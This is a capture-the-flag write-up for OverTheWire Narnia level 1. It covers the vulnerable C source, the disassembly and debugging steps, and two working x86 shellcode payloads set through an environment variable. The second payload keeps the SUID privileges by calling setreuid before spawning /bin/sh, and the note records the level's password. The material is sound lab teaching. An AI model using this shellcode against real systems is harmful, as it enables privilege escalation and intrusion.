## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #BinaryExploitation #ShellcodeInjection #BufferOverflow
**Completion Date & Time :** 2026 - 02 - 08 / 22:34

---
## FLAG : `0h8Tj5fxbv`

---
## Solution :

### Step 1 : Check for `narnia1.c` file
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}

```
The code looks for `EGG` environment variable.
We could identify two cases here : 
1. If the result was `null`, the program will just exit.
2. Otherwise, it will execute whatever is inside the `EGG`.
### Step 2 : Set `EGG` environment variable.

```bash
export EGG=AAAA
```

Let's try to dissamble :
```asm
   0x08049186 <+0> :    push   ebp
   0x08049187 <+1> :	mov    ebp,esp
   0x08049189 <+3> :	sub    esp,0x4
   0x0804918c <+6> :	push   0x804a008
   0x08049191 <+11>:	call   0x8049040 <getenv@plt>
   0x08049196 <+16>:	add    esp,0x4
   0x08049199 <+19>:	test   eax,eax
   0x0804919b <+21>:	jne    0x80491b1 <main+43>
   0x0804919d <+23>:	push   0x804a00c
   0x080491a2 <+28>:	call   0x8049050 <puts@plt>
   0x080491a7 <+33>:	add    esp,0x4
   0x080491aa <+36>:	push   0x1
   0x080491ac <+38>:	call   0x8049060 <exit@plt>
   0x080491b1 <+43>:	push   0x804a041
   0x080491b6 <+48>:	call   0x8049050 <puts@plt>
   0x080491bb <+53>:	add    esp,0x4
   0x080491be <+56>:	push   0x804a008
   0x080491c3 <+61>:	call   0x8049040 <getenv@plt>
   0x080491c8 <+66>:	add    esp,0x4
   0x080491cb <+69>:	mov    DWORD PTR [ebp-0x4],eax
   0x080491ce <+72>:	mov    eax,DWORD PTR [ebp-0x4]
   0x080491d1 <+75>:	call   eax
   0x080491d3 <+77>:	mov    eax,0x0
   0x080491d8 <+82>:	leave
   0x080491d9 <+83>:	ret

```

Here look at `main+75`, it call `eax` register. This mean, it will call whatever stored in eax. Let's put a break point, and find out what is inside `eax`.
```asm
gef➤  x $eax
0xffffde05:	0x41414141
```

Alright, our assumption before was correct. So, to solve this, we just need to inject a shellcode to `EGG`, so when it call the function, it will call the shell.
But, let's try to run with `$EGG=AAAA` condition first :
```shell
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault (core dumped)
```

As expected, it crashes :D.
### Step 3 : Inject Shellcode

We could find free shellcode database from [here](https://shell-storm.org/shellcode/index.html)
Since the file was 32 bit, we will use `Linux/x86` version only. We will try `Linux/x86 - execve(/bin/sh) - 25 bytes by Magnefikko`. 
```bash
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")')
```

As the result :
```shell
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia1
```

We spawned a shell, but we don't get the privileges of `narnia2`. Let's try breakdown the shellcode.
```asm
\xeb\x0b              ; jmp short (jump forward 11 bytes)
\x5b                  ; pop ebx (get "/bin/sh" address)
\x31\xc0              ; xor eax, eax (clear eax)
\x31\xc9              ; xor ecx, ecx (clear ecx = NULL)
\x31\xd2              ; xor edx, edx (clear edx = NULL)
\xb0\x0b              ; mov al, 0x0b (syscall 11 = execve)
\xcd\x80              ; int 0x80 (trigger syscall)
\xe8\xf0\xff\xff\xff  ; call back (pushes next address)
\x2f\x62\x69\x6e\x2f\x73\x68  ; "/bin/sh"
```

So, the shellcode above **ONLY** spawns a shell. The problem is : When a SUID binary spawns a shell, Linux security **drops** privileges by default.
To solve this, we must call `setreuid()` before `execve()` to make **real UID = effective UID**.
We must find the shellcode with `setreuid()` in the database, which is `Linux/x86 - setreuid(geteuid(),geteuid()),execve(/bin/sh,0,0) - 34bytes by blue9057`.

Let's try to set it again :
```bash
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')
```

And here is the result :
```shell
narnia1@narnia:/narnia$ export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
0h8Tj5fxbv

```

### Additional : 
If  we breakdown the shellcode :
```asm
\x6a\x31          ; push 0x31 (syscall 49 = geteuid)
\x58              ; pop eax
\x99              ; cdq (clear edx)
\xcd\x80          ; int 0x80 → eax = euid
\x89\xc3          ; mov ebx, eax (ebx = euid)
\x89\xc1          ; mov ecx, eax (ecx = euid)
\x6a\x46          ; push 0x46 (syscall 70 = setreuid)
\x58              ; pop eax
\xcd\x80          ; int 0x80 → setreuid(euid, euid)
\xb0\x0b          ; mov al, 0x0b (syscall 11 = execve)
... (rest spawns /bin/sh)
```

It spawns the `setreuid()` first before spawns the shell. The key difference was only

---
### Key Takeaways : 
- When a SUID binary spawns a shell, Linux security **drops** privileges by default.
- `$(...)` command in shell will run everything inside it
- If we try to directly set `EGG` without $(), it will just put everything as a basic `strings`.
- We couldn't use `setuid(0)` or `setreuid(0,0)`, this would try to set UID to root which is not the Narnia1 scenario (we need to set the UID to `narnia2`).
- So, the solution is to use `geteuid()` as the parameter of `setuid()` or `setreuid()`. This will give us the privilege of *Effective UID*

---
## Related Concepts : 
[[setreuid()]], [[setuid()]], [[execve()]],[[geteuid()]],[[User ID in Linux]], [[Environment Variables]], [[getenv()]], [[Python - Payload Insert]], [[Assembly]]

---
## Next Challenge :
[[Narnia (2 -> 3)]]


